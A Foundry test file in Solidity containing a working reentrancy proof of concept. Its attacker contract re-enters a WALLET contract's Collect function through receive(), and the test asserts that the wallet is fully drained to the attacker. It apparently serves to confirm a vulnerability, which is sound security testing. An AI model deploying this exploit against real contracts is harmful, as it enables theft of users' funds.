// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract Attacker {
    WALLET public targetWallet;
    uint256 public attackCount;
    uint256 public attackAmount;

    constructor(WALLET _wallet, uint256 _amount) payable {
        targetWallet = _wallet;
        attackAmount = _amount;
    }

    function deposit() public payable {
        // Deposit funds to become a holder
        targetWallet.Put{value: msg.value}(0);
    }

    function initAttack() public {
        // Initiate the withdrawal/reentrancy attack
        targetWallet.Collect(attackAmount);
    }

    receive() external payable {
        // Re-enter during the withdrawal
        if (attackCount < 1) {
            attackCount++;
            targetWallet.Collect(attackAmount);
        }
    }
}

contract ReentrancyTest is Test {
    Log public logContract;
    WALLET public wallet;
    Attacker public attacker;
    
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;
    uint256 public constant WITHDRAW_AMOUNT = 0.5 ether;
    
    function setUp() public {
        // Deploy the Log contract
        logContract = new Log();
        
        // Deploy the vulnerable WALLET contract
        wallet = new WALLET(address(logContract));
        
        // Deploy attacker with initial deposit
        attacker = new Attacker{value: DEPOSIT_AMOUNT}(wallet, WITHDRAW_AMOUNT);
        
        // Deposit into WALLET
        attacker.deposit{value: DEPOSIT_AMOUNT}();
    }

    function testReentrancyVulnerability() public {
        // Fast forward past unlock time
        vm.warp(block.timestamp + 1 days);
        
        // Record initial balances for verification
        uint256 initialWalletBalance = address(wallet).balance;
        assertEq(initialWalletBalance, DEPOSIT_AMOUNT, "Initial wallet balance incorrect");
        
        // DIFFERENTIAL STATE CHECK START
        console.log("--- BEFORE-Reentrancy Attack ---");
        uint256 walletEthBefore = address(wallet).balance;
        uint256 attackerEthBefore = address(attacker).balance;
        // Fix: Capture account balance correctly
        (, uint256 attackerAccountBalanceBefore) = wallet.Acc(address(attacker));
        
        console.log("WALLET contract ETH balance (pre-attack):", walletEthBefore);
        console.log("Attacker contract ETH balance (pre-attack):", attackerEthBefore);
        console.log("Attacker account balance in WALLET (pre-attack):", attackerAccountBalanceBefore);
        // DIFFERENTIAL STATE CHECK END

        console.log("--- EXECUTE Reentrancy Attack ---");
        // Execute reentrancy attack
        attacker.initAttack();
        
        // DIFFERENTIAL STATE CHECK START
        console.log("--- AFTER-Reentrancy Attack ---");
        uint256 walletEthAfter = address(wallet).balance;
        uint256 attackerEthAfter = address(attacker).balance;
        // Fix: Capture account balance correctly
        (, uint256 attackerAccountBalanceAfter) = wallet.Acc(address(attacker));
        
        console.log("WALLET contract ETH balance (post-attack):", walletEthAfter);
        console.log("Attacker contract ETH balance (post-attack):", attackerEthAfter);
        console.log("Attacker account balance in WALLET (post-attack):", attackerAccountBalanceAfter);
        
        // State change analysis
        bool walletBalanceDrained = walletEthAfter < walletEthBefore;
        bool attackerBalanceIncreased = attackerEthAfter > attackerEthBefore;
        bool accountBalanceDepleted = attackerAccountBalanceAfter < attackerAccountBalanceBefore;
        
        console.log("Wallet balance drained:", walletBalanceDrained);
        console.log("Attacker balance increased:", attackerBalanceIncreased);
        console.log("Account balance depleted:", accountBalanceDepleted);
        
        // Vulnerability confirmation logic
        bool vulnerabilityVerified = walletBalanceDrained && 
                                    attackerBalanceIncreased && 
                                    accountBalanceDepleted &&
                                    walletEthAfter == 0;
        
        if (vulnerabilityVerified) {
            console.log("Vulnerability Exists: Reentrant attack successfully drained funds");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate exploitation");
        }
        // DIFFERENTIAL STATE CHECK END

        // Verify attacker drained funds via reentrancy
        assertEq(
            address(attacker).balance, 
            2 * DEPOSIT_AMOUNT,
            "Attacker balance should be twice the deposit after attack"
        );
        assertEq(
            address(wallet).balance, 
            0, 
            "Wallet should be drained after attack"
        );
    }
}